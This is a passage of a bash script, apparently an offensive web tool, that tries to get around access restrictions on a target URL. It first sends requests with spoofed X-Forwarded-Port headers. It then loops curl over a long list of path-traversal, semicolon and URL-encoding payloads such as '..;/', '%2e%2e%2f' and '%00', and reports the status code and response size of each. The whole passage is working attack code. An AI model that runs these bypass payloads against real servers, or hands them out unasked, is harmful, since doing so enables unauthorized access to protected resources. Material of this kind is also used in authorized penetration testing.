done

	echo -e ${red}"-------------------------"${end}
	echo -e ${ltcyan}"[+] Port Based Bypass"${end}
	echo -e ${red}"-------------------------"${end}

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Port: 443" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Port: 443" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Port: 443 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Port: 4443" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Port: 4443" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Port: 4443 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Port: 80" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Port: 80" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Port: 80 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Port: 8080" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Port: 8080" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Port: 8080 - ${url}"
done

for url in "$1$2"; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "X-Forwarded-Port: 8443" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "X-Forwarded-Port: 8443" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> X-Forwarded-Port: 8443 - ${url}"
done

	echo -e ${blue}"----------------------"${end}
	echo -e ${ltcyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
for url in "$1$2" "$1#$2" "$1#?$2" "$1%$2" "$1%09$2" "$1%09%3b$2" "$1%09..$2" "$1%09;$2" "$1%20$2" "$1%20/$2" "$1%23$2" "$1%23%3f$2" "$1%252f%252f$2" "$1%252f/$2" "$1%26$2" "$1%2e$2" "$1%2e%2e$2" "$1%2e%2e%2f$2" "$1%2e%2e/$2" "$1%2f$2" "$1%2f%20%23$2" "$1%2f%23$2" "$1%2f%2f$2" "$1%2f%3b%2f$2" "$1%2f%3b%2f%2f$2" "$1%2f%3f$2" "$1%2f%3f/$2" "$1%2f/$2" "$1%3b$2" "$1%3b%09$2" "$1%3b%2f%2e%2e$2" "$1%3b%2f%2e%2e%2f%2e%2e%2f%2f$2" "$1%3b%2f%2e.$2" "$1%3b%2f..$2" "$1%3b/%2e%2e/..%2f%2f$2" "$1%3b/%2e.$2" "$1%3b/%2f%2f../$2" "$1%3b/..$2" "$1%3b//%2f../$2" "$1%3f$2" "$1%3f%23$2" "$1%3f%3f$2" "$1&$2" "$1*$2" "$1.$2" "$1.%2e/$2" "$1..$2" "$1..%00/$2" "$1..%00/;$2" "$1..%00;/$2" "$1..%09$2" "$1..%0d/$2" "$1..%0d/;$2" "$1..%0d;/$2" "$1..%5c$2" "$1..%5c/$2" "$1..%ff/$2" "$1..%ff/;$2" "$1..%ff;/$2" "$1../$2" "$1../%2f$2" "$1.././$2" "$1..;$2" "$1..;%00/$2" "$1..;%0d/$2" "$1..;%ff/$2" "$1..;/$2" "$1..;\ $2" "$1..;\;$2" "$1..\ $2" "$1..\;$2" "$1./.$2" "$1.//./$2" "$1.html$2" "$1.json$2" "$1/$2" "$1/%20#$2" "$1/%20%23$2" "$1/%252e%252e%252f/$2" "$1/%252e%252e%253b/$2" "$1/%252e%252f/$2" "$1/%252e%253b/$2" "$1/%252e/$2" "$1/%252f$2" "$1/%2e%2e$2" "$1/%2e%2e%3b/$2" "$1/%2e%2e/$2" "$1/%2e%2f/$2" "$1/%2e%3b/$2" "$1/%2e%3b//$2" "$1/%2e/$2" "$1/%2e//$2" "$1/%2f$2" "$1/%3b/$2" "$1/*$2" "$1/*/$2" "$1/.$2" "$1/..$2" "$1/..%2f$2" "$1/..%2f..%2f$2" "$1/..%2f..%2f..%2f$2" "$1/../$2" "$1/../../$2" "$1/../../../$2" "$1/../../..//$2" "$1/../..//$2" "$1/../..//../$2" "$1/../..;/$2" "$1/.././../$2" "$1/../.;/../$2" "$1/..//$2" "$1/..//../$2" "$1/..//../../$2" "$1/..//..;/$2" "$1/../;/$2" "$1/../;/../$2" "$1/..;%2f$2" "$1/..;%2f..;%2f$2" "$1/..;%2f..;%2f..;%2f$2" "$1/..;/$2" "$1/..;/../$2" "$1/..;/..;/$2" "$1/..;//$2" "$1/..;//../$2" "$1/..;//..;/$2" "$1/..;/;/$2" "$1/..;/;/..;/$2" "$1/./$2" "$1/.//$2" "$1/.;/$2" "$1/.;//$2" "$1/.randomstring$2" "$1//$2" "$1//.$2" "$1//..$2" "$1//../../$2" "$1//..;$2" "$1//./$2" "$1//.;/$2" "$1///..$2" "$1///../$2" "$1///..//$2" "$1///..;$2" "$1///..;/$2" "$1///..;//$2" "$1////$2" "$1//;/$2" "$1//?anything$2" "$1/;/$2" "$1/;//$2" "$1/;x$2" "$1/;x/$2" "$1/x/../$2" "$1/x/..//$2" "$1/x/../;/$2" "$1/x/..;/$2" "$1/x/..;//$2" "$1/x/..;/;/$2" "$1/x//../$2" "$1/x//..;/$2" "$1/x/;/../$2" "$1/x/;/..;/$2" "$1;$2" "$1;%09$2" "$1;%09..$2" "$1;%09..;$2" "$1;%09;$2" "$1;%2F..$2" "$1;%2f%2e%2e$2" "$1;%2f%2e%2e%2f%2e%2e%2f%2f$2" "$1;%2f%2f/../$2" "$1;%2f..$2" "$1;%2f..%2f%2e%2e%2f%2f$2" "$1;%2f..%2f..%2f%2f$2" "$1;%2f..%2f/$2" "$1;%2f..%2f/..%2f$2" "$1;%2f..%2f/../$2" "$1;%2f../%2f..%2f$2" "$1;%2f../%2f../$2" "$1;%2f..//..%2f$2" "$1;%2f..//../$2" "$1;%2f..///$2" "$1;%2f..///;$2" "$1;%2f..//;/$2" "$1;%2f..//;/;$2" "$1;%2f../;//$2" "$1;%2f../;/;/$2" "$1;%2f../;/;/;$2" "$1;%2f..;///$2" "$1;%2f..;//;/$2" "$1;%2f..;/;//$2" "$1;%2f/%2f../$2" "$1;%2f//..%2f$2" "$1;%2f//../$2" "$1;%2f//..;/$2" "$1;%2f/;/../$2" "$1;%2f/;/..;/$2" "$1;%2f;//../$2" "$1;%2f;/;/..;/$2" "$1;/%2e%2e$2" "$1;/%2e%2e%2f%2f$2" "$1;/%2e%2e%2f/$2" "$1;/%2e%2e/$2" "$1;/%2e.$2" "$1;/%2f%2f../$2" "$1;/%2f/..%2f$2" "$1;/%2f/../$2" "$1;/.%2e$2" "$1;/.%2e/%2e%2e/%2f$2" "$1;/..$2" "$1;/..%2f$2" "$1;/..%2f%2f../$2" "$1;/..%2f..%2f$2" "$1;/..%2f/$2" "$1;/..%2f//$2" "$1;/../$2" "$1;/../%2f/$2" "$1;/../../$2" "$1;/../..//$2" "$1;/.././../$2" "$1;/../.;/../$2" "$1;/..//$2" "$1;/..//%2e%2e/$2" "$1;/..//%2f$2" "$1;/..//../$2" "$1;/..///$2" "$1;/../;/$2" "$1;/../;/../$2" "$1;/..;$2" "$1;/.;.$2" "$1;//%2f../$2" "$1;//..$2" "$1;//../../$2" "$1;///..$2" "$1;///../$2" "$1;///..//$2" "$1;x$2" "$1;x/$2" "$1;x;$2" "$1?$2" "$1???$2" "$1??$2" "$1\..\.\ $2" ; do
code=$(curl -ks -o /dev/null -i -w "%{http_code}" -H "User-Agent: Vigrahak" "$url")
size=$(curl -ks -o /dev/null -i -w "%{size_download}" -H "User-Agent: Vigrahak" "$url")
print_result "$code" "$size"
echo "  --> ${url}"
done



echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'


